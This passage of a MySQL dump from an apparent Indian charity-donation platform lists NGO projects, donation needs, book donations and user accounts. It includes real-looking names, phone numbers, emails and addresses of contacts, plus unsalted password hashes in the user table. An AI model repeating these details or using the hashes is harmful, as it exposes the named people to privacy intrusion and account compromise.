(9, '2', '44999', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 slums of Indore and preparation for scaling up a Waste Recycling Plant for this community', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2009-12-01', '2009-12-31', NULL, NULL, 'http://www.yousee.in/images/UC-PC-RagPickers_project-Indore-Phase3.pdf', 'https://lh3.googleusercontent.com/_wAuKZKGVdSo/Tce048PQvgI/AAAAAAAAACc/fXM0eF4yZPw/s640/video%20in%20class.JPG'),
(10, '2', '79355', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 slums of Indore and preparation for scaling up a Waste Recycling Plant for this community', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2010-01-01', '2010-01-31', NULL, NULL, 'http://www.yousee.in/images/UC-PC-RagPickers_project-Indore-Phase3-Jan10.pdf', 'https://lh6.googleusercontent.com/_wAuKZKGVdSo/Tce4RW4pSrI/AAAAAAAAACs/QfgDMbJxe3A/s640/rag%20seperation.JPG'),
(11, '3', '24000', 'IT education for 303 Girl Children at a School run by Palli Unnayan Seva Samiti near Bhuwaneshwar for the poor', NULL, 'Education', NULL, 'Bhubaneswar', 'Khurda', 'Orissa', '3', '2010-10-01', '2011-01-31', NULL, NULL, 'http://www.yousee.in/images/UC-RC-PUSS_Oct-2010_to_Jan-2011.pdf', 'https://lh4.googleusercontent.com/-G0Sr6dw4bl4/TfiY2K9XLjI/AAAAAAAAADw/7cEnbV6Ka1o/s128/PUSS%252520Computer%252520Center.jpg'),
(12, '2', '123921', 'Providing Primary Education and Financial Inclusion for RagPicking community in 2 Slums of Indore and investments for scaling up a Waste Recycling plant', NULL, 'Integrated', 'Education, Health,  Environment', 'Indore', 'Indore', 'Madhya Pradesh', '1', '2010-05-01', '2010-06-30', NULL, NULL, 'http://www.yousee.in/images/UC-RC-Indore_Integrated_Development_Project_May-June_2010.pdf', 'https://lh6.googleusercontent.com/-XV1lmgAtjA8/TfiYdNuByzI/AAAAAAAAADs/pAtxwRnVjIQ/s128/Indore%252520CRC%252520program.JPG'),
(13, '5', '3000', 'Green Reward for Silent Environmentalists- New Bi-cycle donation for Ragpickers', NULL, 'Environment', 'UC, Environment, Ragpickers,Bi-Cycle', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', NULL, '2010-11-13', '2010-11-13', NULL, NULL, 'http://www.yousee.in/images/UC-RC-Donate_Waste_Result_Certificate.pdf ', 'https://lh3.googleusercontent.com/-2DzcPYANesE/Tn7GPLF4OyI/AAAAAAAAAHM/9cBmXqHek-Q/s128/Cycle%252520Donation%252520for%252520RagPicker.jpg'),
(14, '6', '32268', 'Supporting Education for Hearing Impaired Children at AshrayAkruti', NULL, 'Education', 'Education, Hearing Impaired, Children with disability, Ashray Akruti', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '5', '2011-07-01', '2011-08-31', NULL, NULL, 'http://www.yousee.in/images/UC-RC-Ashray_Akruti_Result_Certificate.pdf ', 'https://lh4.googleusercontent.com/-zgELjdtCijc/Tn7GMOxWQDE/AAAAAAAAAHA/xCpu4aoi3Ps/s144-c/September252011.jpg'),
(15, '4', '84672', 'Deploying IT applications and infrastructure for enabling digitization of Patient Care records in 6 Mobile Health Clinics', NULL, 'Health', NULL, NULL, NULL, 'Tamil Nadu', '2', '2011-03-01', '2011-09-30', NULL, NULL, 'http://yousee.in/images/Isha_Mobile_Health_Clinics-Result_Certificate_Mar-Sep_2011.pdf', 'https://lh3.googleusercontent.com/_wAuKZKGVdSo/TceWxvu1PlI/AAAAAAAAABE/zxn3tjM1bTM/s640/patient%20data%20being%20directly%20captured%20in%20laptop.jpg '),
(16, '6', '50670', 'Supporting Education for Hearing Impaired Children at AshrayAkruti', '', 'Education', 'Education, Hearing Impaired, Children with disability, Ashray Akruti', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '5', '2011-09-01', '2011-11-30', NULL, NULL, 'http://yousee.in/documents/Ashray_Akruti_Result_Certificate_Sept-Nov_2011.pdf', 'https://lh4.googleusercontent.com/-zgELjdtCijc/Tn7GMOxWQDE/AAAAAAAAAHA/xCpu4aoi3Ps/s144-c/September252011.jpg'),
(17, '8', '42626', 'Supporting Education and Life skill Development for Children from Underserved Communities ', NULL, 'Education', NULL, 'Hyderabad', NULL, 'Andhra Pradesh', '6', '2011-10-01', '2011-11-30', NULL, NULL, 'http://yousee.in/documents/Adhya_Result_Certificate_Oct-Nov_2011_ver2.pdf', 'https://lh4.googleusercontent.com/-fwQsiqOaa4s/TwLgfu67anI/AAAAAAAAAH4/1p_UPmsi5XI/s128/Adhya.jpg'),
(18, '11', '27126', 'Supporting Government School to Enhance Learning Environment', 'Supporting Government School to Enhance Learning Environment', 'Education', NULL, 'Hyderabad', NULL, 'Andhra Pradesh', '10', '2011-07-01', '2012-01-31', NULL, NULL, 'http://yousee.in/documents/UC_RC_MTWF_Jul2011-Jan2012.pdf', 'https://lh3.googleusercontent.com/-6WBOwYCXu_w/TzJ2OGeYiBI/AAAAAAAAAIc/SjCn_nd4MRs/s128/MoveTheWheelFoundation.jpg?gl=IN'),
(19, '9', '283893', 'Providing Vocational Training and generating livelihoods for women from underprivileged communities.', NULL, 'Vocational Training', NULL, 'Guwahati', NULL, 'Assam', '9', '2011-11-01', '2012-02-29', NULL, NULL, 'http://yousee.in/documents/Maitri_Results_Nov2011-Jan2012.pdf', 'https://lh5.googleusercontent.com/-wiis-5dLkBY/T12XkkqFcpI/AAAAAAAAAIs/rFuWWFS_dDY/s128/Maitri.gif?gl=IN'),
(20, '11', '5435', 'Setting up compost garden at Gowlidoddi Government School', NULL, 'Environment', NULL, 'Hyderabad', NULL, 'Andhra Pradesh', '10', '2011-12-12', '2012-01-31', NULL, NULL, 'http://yousee.in/documents/Compost_Garden_Gowlidoddi_School.pdf', 'https://lh5.googleusercontent.com/-aCTEUYuIaGI/T146P2aAvoE/AAAAAAAAAI8/hjU2v9robUo/s144-c/March122012.jpg?gl=IN'),
(21, '10', '250000', 'Support strengthening infrastructure for Paediatric Care in ICH Govt Hospital', NULL, 'Health', NULL, 'Chennai', NULL, 'Tamil Nadu', '8', '2011-12-01', '2012-02-29', NULL, NULL, 'http://yousee.in/documents/Ekam_ICH_Results_Dec2011-Jan2012.pdf', 'https://lh4.googleusercontent.com/-TxSB4znUp-M/T2obTgGb0XI/AAAAAAAAAJM/iXhkrvQBXsU/s128/ICH%20Image.jpg'),
(22, '8', '39667', 'Supporting Education and Life skill Development for Children from Underserved Communities ', NULL, 'Education', NULL, 'Hyderabad', NULL, 'Andhra Pradesh', '6', '2011-12-01', '2012-03-31', NULL, NULL, 'http://yousee.in/documents/Adhya_Result_Certificate_Dec2011-Mar2012.pdf', 'https://lh4.googleusercontent.com/-fwQsiqOaa4s/TwLgfu67anI/AAAAAAAAAH4/1p_UPmsi5XI/s128/Adhya.jpg'),
(23, '6', '82787', 'Supporting Education for Hearing Impaired Children at AshrayAkruti', NULL, 'Education', 'Education, Hearing Impaired, Children with disability, Ashray Akruti', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '5', '2011-12-01', '2012-03-31', NULL, NULL, 'http://yousee.in/documents/Ashray_Akruti_Result_Certificate_Dec_2011-April_2012.pdf', 'https://lh4.googleusercontent.com/-zgELjdtCijc/Tn7GMOxWQDE/AAAAAAAAAHA/xCpu4aoi3Ps/s144-c/September252011.jpg'),
(24, '12', '14667', 'Supporting Public Health Facilities-Project with Gandhi Hospital', NULL, 'Health', NULL, 'Hyderabad', NULL, 'Andhra Pradesh', '11', '2012-05-01', '2012-05-31', NULL, NULL, 'http://yousee.in/documents/Gandhi_Hopsital_Results_Document_May-2012.pdf', 'https://lh4.googleusercontent.com/-1Pr8vesg9Ms/T84rJbasvWI/AAAAAAAAAJo/DWRxPfAYVBM/s331/Gandhi%2520Hospital.jpg?gl=IN'),
(25, '8', '31000', 'Supporting Education and Life skill Development for Children from Underserved Communities ', NULL, 'Education', 'Education', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '6', '2012-04-01', '2012-07-31', NULL, NULL, 'http://yousee.in/documents/Adhya_Result_Certificate_April-July_2012.pdf', 'https://lh4.googleusercontent.com/-fwQsiqOaa4s/TwLgfu67anI/AAAAAAAAAH4/1p_UPmsi5XI/s128/Adhya.jpg'),
(26, '6', '48950', 'Supporting Education for Hearing Impaired Children at AshrayAkruti', NULL, 'Education', 'Education', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '5', '2012-04-01', '2012-07-31', NULL, NULL, 'http://yousee.in/documents/Ashray_Akruti_Result_Certifiate_April-July_2012.pdf', 'https://lh4.googleusercontent.com/-zgELjdtCijc/Tn7GMOxWQDE/AAAAAAAAAHA/xCpu4aoi3Ps/s144-c/September252011.jpg'),
(27, '15', '215000', 'Tele-Helpline for Career Counselling support for Students', 'Tele-Helpline for Career Counselling support for Students', 'Education', 'Education', 'Hyderabad', NULL, 'Andhra Pradesh', '12', '2012-08-01', '2012-10-31', NULL, NULL, 'http://yousee.in/documents/Nirmaan_VHL_3.0_Aug-Oct-2012.pdf', 'https://lh4.googleusercontent.com/-o7SgpMJJmNk/UG-a5ccz_2I/AAAAAAAAALI/UdqN-yw8ZZ8/h120/Nirmaan_VHL.jpg'),
(28, '12', '590000', 'Supporting Public Health Facilities-Project with Gandhi Hospital', 'Supporting Public Health Facilities-Project with Gandhi Hospital', 'Health', 'Health', 'Hyderabad', 'Hyderabad', 'Andhra Pradesh', '11', '2012-06-01', '2012-09-30', NULL, NULL, 'http://yousee.in/documents/Gandhi_Hopsital_Results_Document_Jun-Sep_2012.pdf', 'https://lh4.googleusercontent.com/-1Pr8vesg9Ms/T84rJbasvWI/AAAAAAAAAJo/DWRxPfAYVBM/s331/Gandhi%2520Hospital.jpg?gl=IN'),
(29, '14', '43200', 'Education for underprivileged Children', 'Education for underprivileged Children', 'Education', 'Education', 'Delhi', 'Delhi', 'Delhi', '13', '2012-09-01', '2012-10-31', NULL, NULL, 'http://yousee.in/documents/Apni_Pathshala_Results_Document_Sep_Oct_2012.pdf ', 'https://lh5.googleusercontent.com/-j41v7t6rdeQ/ULdpXTEAQ0I/AAAAAAAAALY/GB7_4cVmUgg/h120/Apni_Pathshala.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `project_partners`
--

CREATE TABLE IF NOT EXISTS `project_partners` (
  `partner_id` int(3) NOT NULL,
  `name` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `type` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `address` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `hq_town_city` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `hq_state` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `hq_country` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `hq_pin_code` varchar(10) COLLATE utf8_bin DEFAULT NULL,
  `contact_first_name` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `contact_last_name` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `contact_person_gender` varchar(1) COLLATE utf8_bin DEFAULT NULL,
  `contact_person_designation` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `contact_person_phone` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `contact_person_email` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `website_url` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `logo_path` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `logo` blob,
  PRIMARY KEY (`partner_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Project Partners';

--
-- Dumping data for table `project_partners`
--

INSERT INTO `project_partners` (`partner_id`, `name`, `type`, `address`, `hq_town_city`, `hq_state`, `hq_country`, `hq_pin_code`, `contact_first_name`, `contact_last_name`, `contact_person_gender`, `contact_person_designation`, `contact_person_phone`, `contact_person_email`, `website_url`, `logo_path`, `logo`) VALUES
(1, 'Indian Grameen Services', 'Section 25 Company', 'CE-103, 1st Floor, Salt Lake City, Sector-1', 'Kolkota', 'West Bengal', 'INDIA', '700064', 'Arijit', 'Dutta', 'M', 'Managing Director', '9831004016', 'arijit@igsindia.org.in', 'http://igsindia.org.in', '', NULL),
(2, 'Isha Outreach', 'Trust', '23/7U Raja Nagar 2nd Street, Sowripalayam', 'Coimbatore', 'Tamil Nadu', 'India', '641028', 'Swami Pranaka', NULL, 'M', NULL, '9442590016', 'swami.pranaka@ishafoundation.org', 'http://www.ishaoutreach.org', NULL, NULL),
(3, 'Palli Unnayan Seva Samiti', 'Society', 'At/Po-Naharkanta, Khurda', 'Bhubaneswar', 'Orissa', 'India', '752101', 'Swati Suchismita', 'Patra', 'F', 'Secretary', '9439751347', 'kadambini_bhuyan@yahoo.com', 'http://www.pussindia.org', NULL, NULL),
(4, 'Shree Sai Healing Trust', 'Trust', '126, Oliver Road, Mylapore', 'Chennai', 'Chennai', 'India', '600004', 'Hemanth Kumar', NULL, 'M', 'Trustee', '9840154388', 'hksurabi@hotmail.com', NULL, NULL, NULL),
(5, 'Ashray Akruti', 'Society', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, 'Mr. Babu', NULL, 'M', 'Director', '9391021278', 'ashrayakruti@yahoo.com', 'http://www.ashrayakruti.org', NULL, NULL),
(6, 'Adhya Educational Society', 'Society', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, 'Madhulika', 'Sagaram', 'F', 'President', '8897541237', 'madhu@adhya.org', 'http://www.adhya.org', NULL, NULL),
(7, 'Multiple Partners', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(8, 'Ekam Foundation', 'Trust', '16/ 19, Jayalakshmipuram 1st Street ,Nungambakkam', 'Chennai', 'Tamil Nadu', 'India', '600034', 'Sai Lakshmi', NULL, 'F', 'Managing Trustee', '9003035307', 'sailakshmi@ekamoneness.org', 'http://www.ekamoneness.org', NULL, NULL),
(9, 'Purbanchal Maitri Development Society', 'Society', '195/1, Rajdanga Chakrabortypara, Kasba', 'Kolkota', 'West Bengal', 'India', '700107', 'Gitali', 'Thakur', 'F', 'Secretary', '9706050355', 'gitali.thakur@gmail.com', 'http://www.mymaitri.org', NULL, NULL),
(10, 'Move The Wheel Foundation', 'Trust', 'Block 6, 701, Hill Ridge Springs, Gachibowli', 'Hyderabad', 'Andhra Pradesh', 'India', '500032', 'Sunita', 'Reddy', 'F', 'Honorary President', '9949697249', 'sunita@movethewheel.org', 'http://www.movethewheel.org', NULL, NULL),
(11, 'Gandhi Hospital', 'Govt Institution', 'Padmarao Nagar', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(12, 'Nirmaan Organization ', 'Society', 'H.No.1-60/30/12, First Floor, Anjaiah Nagar, Gachibowli, Hyderabad ', 'Hyderabad', 'Andhra Pradesh', 'India', '500084', 'Sridhar ', 'Neelam', 'M', 'CEO', '9032612000', 'sridhar@nirmaan.org', 'http://www.nirmaan.org', NULL, NULL),
(13, 'Apni Pathshala Foundation', 'Society', 'E  328 , East of Kailash', 'Delhi', 'Delhi', 'India', NULL, 'Sonu', 'Singh', 'F', 'President', NULL, 'ngoapnipathshala@gmail.com', 'http://www.apnipathshala.com/', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `smcategories`
--

CREATE TABLE IF NOT EXISTS `smcategories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(45) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=12 ;

--
-- Dumping data for table `smcategories`
--

INSERT INTO `smcategories` (`id`, `name`) VALUES
(1, 'Clothes'),
(2, 'Groceries'),
(3, 'Furniture'),
(4, 'Toiletries'),
(5, 'Medical'),
(6, 'Electrical'),
(7, 'Electronics'),
(8, 'Stationery'),
(9, 'Sports'),
(10, 'Domestic'),
(11, 'Computer & Peripherals');

-- --------------------------------------------------------

--
-- Table structure for table `smcommitments`
--

CREATE TABLE IF NOT EXISTS `smcommitments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smuser_id` int(11) NOT NULL,
  `smrequirement_id` int(11) NOT NULL,
  `quantity` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;

--
-- Dumping data for table `smcommitments`
--

INSERT INTO `smcommitments` (`id`, `smuser_id`, `smrequirement_id`, `quantity`) VALUES
(1, 13, 25, 1000),
(2, 13, 2, 750),
(3, 14, 5, 10),
(4, 14, 5, 40),
(5, 14, 4, 100),
(8, 16, 1, 30),
(25, 14, 7, 40),
(24, 14, 59, 1),
(23, 14, 59, 1),
(22, 16, 63, 10);

-- --------------------------------------------------------

--
-- Table structure for table `smgroups`
--

CREATE TABLE IF NOT EXISTS `smgroups` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `smgroups`
--

INSERT INTO `smgroups` (`id`, `name`) VALUES
(1, 'administrators'),
(2, 'donors'),
(3, 'ngos'),
(4, 'test');

-- --------------------------------------------------------

--
-- Table structure for table `smrequirements`
--

CREATE TABLE IF NOT EXISTS `smrequirements` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smuser_id` int(11) NOT NULL,
  `smcategory_id` int(11) NOT NULL,
  `item` varchar(45) DEFAULT NULL,
  `total` int(11) DEFAULT NULL,
  `units` varchar(45) DEFAULT NULL,
  `committed` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `ngo_id_idx` (`smuser_id`),
  KEY `category_id_idx` (`smcategory_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;

--
-- Dumping data for table `smrequirements`
--

INSERT INTO `smrequirements` (`id`, `smuser_id`, `smcategory_id`, `item`, `total`, `units`, `committed`) VALUES
(1, 7, 1, 'Uniform', 50, 'pairs', 30),
(2, 7, 2, 'Rice', 750, 'kgs per month', 750),
(3, 7, 2, 'Dal', 100, 'Kgs', 0),
(4, 7, 2, 'Oil', 100, 'Litres', 100),
(5, 7, 2, 'Sugar', 50, 'Kgs', 50),
(6, 7, 2, 'Tamarind', 20, 'Kgs', 0),
(7, 7, 2, 'Bombay Rava', 40, 'Kgs', 40),
(8, 7, 2, 'Idly Rava', 40, 'Kgs', 0),
(9, 7, 2, 'Wheat Flour', 50, 'Kgs', 0),
(10, 7, 4, 'Tooth Paste', 170, 'Tubes', 0),
(11, 7, 4, 'Coconut Oil', 170, 'Bottles', 0),
(12, 7, 4, 'Bathing Soap', 170, 'Bars', 0),
(13, 7, 4, 'Washing Soap', 170, 'Bars', 0),
(14, 7, 4, 'Tooth Brush', 170, 'Brushes', 0),
(15, 9, 6, 'Fans', 4, 'Fans', 0),
(16, 9, 6, 'Tube Lights', 6, 'Lights', 0),
(17, 9, 6, 'Water Purifier', 1, 'Purifier', 0),
(18, 9, 8, 'Charts - A4 Size', 1000, 'Charts', 0),
(19, 9, 1, 'Bed Sheets', 40, 'Sheets', 0),
(20, 9, 2, 'Rice', 100, 'Kgs', 0),
(21, 9, 2, 'Oil', 20, 'Litres', 0),
(22, 9, 1, 'Dal', 10, 'Kgs', 0),
(23, 10, 1, 'Uniform', 400, 'pairs', 0),
(24, 10, 8, 'Notebooks', 1000, 'Long Books', 0),
(25, 10, 8, 'Pens & Pencils', 1000, 'Pairs', 1000),
(26, 10, 8, 'Compass Box', 100, 'Boxes', 0),
(27, 10, 8, 'Calculator', 20, 'Calculators', 0),
(28, 10, 3, 'Fibre Chair', 60, 'Chairs', 0),
(29, 10, 3, '2 Seater Bench', 20, 'Benches', 0),
(30, 10, 2, 'Rice', 600, 'Kgs', 0),
(31, 10, 2, 'Oil', 45, 'Litres', 0),
(32, 10, 2, 'Tur Dal', 25, 'Kgs', 0),
(33, 11, 11, 'Computers', 10, 'Desktops', 0),
(34, 11, 7, 'DVD Player', 2, 'Players', 0),
(35, 11, 8, 'Long Note Book', 800, 'Long Books', 0),
(36, 11, 8, 'Drawing Chart', 200, 'Charts', 0),
(37, 11, 8, 'Pens', 150, 'Pens', 0),
(38, 11, 6, 'Television', 2, 'TV', 0),
(39, 11, 3, 'Table', 1, 'Table', 0),
(40, 11, 9, 'Cricket Kit', 2, 'Kits', 0),
(41, 11, 8, 'Old News Paper', 100, 'Kgs', 0),
(42, 11, 2, 'Rice', 800, 'Kgs', 0),
(43, 12, 8, 'Course Books - B Sc Nursing', 60, 'Sets', 0),
(44, 12, 8, 'Pen Pencils & Eraser', 400, 'Sets', 0),
(45, 12, 8, 'Scale, Sharpener', 400, 'Sets', 0),
(46, 12, 1, 'Highlighters', 400, 'Units', 0),
(47, 12, 8, 'Notebooks', 400, 'Notebooks', 0),
(48, 12, 8, 'Calculator', 250, 'Pieces', 0),
(49, 12, 5, 'Nurse Equipment Kit ', 70, 'Kits', 0),
(50, 12, 5, 'Stethoscope', 62, 'Pieces', 0),
(51, 12, 5, 'Lab Requirements', 20, 'Kits', 0),
(52, 12, 5, 'BP & BMI Machine', 2, 'Kits', 0),
(53, 12, 2, 'Rice', 29200, 'Kgs/Year', 0),
(54, 12, 2, 'Wheat Flour', 730, 'Kgs/Year', 0),
(55, 12, 2, 'Milk', 10950, 'Litres/Year', 0),
(56, 12, 7, 'Fridge', 1, 'Fridge', 0),
(57, 12, 7, 'Microwave', 1, 'Microwave', 0),
(58, 12, 7, 'Water Cooler', 1, 'Unit', 0),
(59, 12, 7, 'AC for Computer Lab', 2, 'Units', 2),
(60, 0, 2, 'rice', 100, 'kgs', 0),
(64, 17, 3, 'Furniture for Class I to Class V', 25, '25 tables to write on', 0),
(63, 15, 1, 'wheat', 150, 'kgs', 10),
(65, 18, 3, 'Furniture for Class I to Class V', 25, '25 tables to write on', 0);

-- --------------------------------------------------------

--
-- Table structure for table `smusers`
--

CREATE TABLE IF NOT EXISTS `smusers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` char(40) NOT NULL,
  `smgroup_id` int(11) NOT NULL,
  `fullname` varchar(255) NOT NULL,
  `location` varchar(255) NOT NULL,
  `address` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `message` varchar(1024) NOT NULL,
  `website` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=20 ;

--
-- Dumping data for table `smusers`
--

INSERT INTO `smusers` (`id`, `username`, `password`, `smgroup_id`, `fullname`, `location`, `address`, `email`, `phone`, `message`, `website`) VALUES
(10, 'CFSS', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 3, 'Center for Social Service', 'Hyderabad', 'Vasundhara'', House no.: 1-10/2,1-10/3, Plot no.: 53, Mamathanagar Colony, Nagole - 500 068 ', 'chellam.kalipillai@gmail.com', '+91 9885472959', '', 'http://cssvision.org/ '),
(3, 'admin', 'b60e53aa8559339919e818782df883ff0f370166', 1, 'Admin', 'triplicane', 'chennai', 'admin@gmail.com', '12345678', 'test admin', 'www.yousee.in'),
(9, 'BHWA', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 3, 'Blind Help Welfare Association ', 'Hyderabad', '49-417, Bapu Nagar, HMT road, Chintal, Quthbullapur, hyderabad, 500054 ', 'info@blindhelp.org', '7207106050', '', 'www.blindhelp.org'),
(7, 'aashray', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 3, 'Aashray Home for Destitute Woman ', 'Hyderabad-47', 'H.No: 16-114, New Mirjalguda, Chinmaya Marg, Malkajgiri, Hyderabad-47, A.P, India ', 'madhavi10573@gmail.com', '9000495026 ', '', 'http://www.aashraysociety.org '),
(11, 'HCHW', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 3, 'Hyderabad of Council of Human Welfare-A.P ', 'Hyderabad', 'Hyderabad', 'rafimohd07@gmail.com', '+919963239786 ', '', 'www.hchw.org '),
(12, 'MDS', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 3, 'Mahila Dakshatha Samiti ', 'Hyderabad', 'Opposite Eshwar Lodge, Near Secunderabad Station, Rezimental Bazaar, HYDERABAD - 500003', 'info@yousee.in', '+91 99492 98330 ', '', ''),
(13, 'shravan', 'e95ff81f6139bbad2ab4afab290a455e25df9b62', 2, 'Shravan Srinivasan', 'India', 'Bangalore', 'shravan.dot@gmail.com', '9844297975', '', ''),
(14, 'gunaranjan', '6c5667da91da44b844e33f6064f9e1ed7c2025c7', 2, 'Gunaranjan', 'Hyderabad', 'Panjagutta', 'gunaranjan@yousee.in', '9000183123', '', ''),
(17, 'anjana_mangalapalli', '01b460a955df1a3c21bc2ddc824205a6b93064eb', 3, 'Anjana Mangalapalli', '', '', 'anjana@movethewheel.org', '9618124123', '', 'www.movethewheel.org'),
(16, 'ramki_donor', 'b60e53aa8559339919e818782df883ff0f370166', 2, 'ramki_as_donor', 'Chennai', 'triplicane', 'testdonor@gmail.com', '12345678', 'God is great', 'http://www.google.com'),
(18, 'MTWF', '01b460a955df1a3c21bc2ddc824205a6b93064eb', 3, 'Move The Wheel Foundation', '', 'Gachibowli, Hyderabad', 'anjana@movethewheel.org', '9618124123', '', 'www.movethewheel.org'),
(19, 'testngo', '37a1c059fb20bd66321cdaac34833af9e7ded079', 3, 'testngo', '', '', 'gunaranjan@yousee.in', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `uc_bookdonations`
--

CREATE TABLE IF NOT EXISTS `uc_bookdonations` (
  `bookid` int(11) NOT NULL AUTO_INCREMENT,
  `donorid` varchar(6) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `donation_date` varchar(50) NOT NULL,
  `categoryid` int(11) NOT NULL,
  `subjectid` int(11) NOT NULL,
  `distributionlocation` varchar(100) DEFAULT NULL,
  `receiver_id` varchar(6) DEFAULT NULL,
  `distributiondate` date NOT NULL,
  `booktitles` varchar(200) NOT NULL,
  `authors` varchar(100) NOT NULL,
  `publishers` varchar(100) NOT NULL,
  `distributionstatus` varchar(50) NOT NULL,
  `storelocations` varchar(50) NOT NULL,
  PRIMARY KEY (`bookid`),
  KEY `bookid` (`bookid`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=192 ;

--
-- Dumping data for table `uc_bookdonations`
--

INSERT INTO `uc_bookdonations` (`bookid`, `donorid`, `donation_date`, `categoryid`, `subjectid`, `distributionlocation`, `receiver_id`, `distributiondate`, `booktitles`, `authors`, `publishers`, `distributionstatus`, `storelocations`) VALUES
(1, '109', '2012-03-13', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Five Fall Into Adventure', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(2, '109', '2012-03-13', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Five Go Off in a Caravan', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(3, '109', '2012-03-13', 2, 5, 'ABSI', '132', '2012-03-18', 'The Naughtiest Girl - Helps a Friend', 'Anne Digby', 'Enid Blyton', 'Distributed', 'absi'),
(4, '109', '2012-03-13', 2, 5, 'ABSI', '134', '2012-03-19', 'The Famous Five - Five Run Away Together', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(5, '109', '2012-03-13', 2, 5, 'ABSI', '136', '2012-03-18', 'The Famous Five - Five On a Hike Together', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(6, '109', '2012-03-13', 2, 5, 'ABSI', '135', '2012-03-18', 'The Naughtiest Girl - is a Monitor', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(7, '109', '2012-03-13', 3, 6, 'ABSI', '133', '2012-03-18', 'Shogun', 'James Clavell', 'Hodder and Stoughton', 'Distributed', 'absi'),
(8, '73', '2012-03-14', 1, 2, 'ABSI', '121', '2012-03-17', 'Personnel/Human Resource Management', 'David A.DeCenzo, Strephen P.Robbins', 'Prentice-Hall India', 'Distributed', 'absi'),
(9, '73', '2012-03-14', 1, 3, 'ABSI', '129', '2012-03-17', 'Modern Economics Theory', 'Sampat Mukherjee', 'New Age International', 'Distributed', 'absi'),
(10, '73', '2012-03-14', 1, 2, 'ABSI', '121', '2012-03-17', 'Organizational Behaviour', 'Stephen P. Robbins', 'Pearson Education', 'Distributed', 'absi'),
(11, '73', '2012-03-14', 1, 2, 'ABSI', '83', '2012-03-17', 'Organizational Theory,Design and Change', 'Gareth R. Jones', 'Pearson Education', 'Distributed', 'absi'),
(12, '73', '2012-03-14', 1, 1, 'ABSI', '135', '2012-03-18', 'The Trusted Advisor ', 'Charles H. Green,David H. Maister and Robert M. Galford', 'Simon ', 'Distributed', 'absi'),
(13, '73', '2012-03-14', 1, 1, 'ABSI', '83', '2012-03-17', 'Business Is People', 'C. Northcote parkinson & M.k. Rustomji', 'Vision Books', 'Distributed', 'absi'),
(14, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five-Five On Finniston Farm', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(15, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven', 'The Secret Seven', 'Hodder Headline Limited', 'Received', 'absi'),
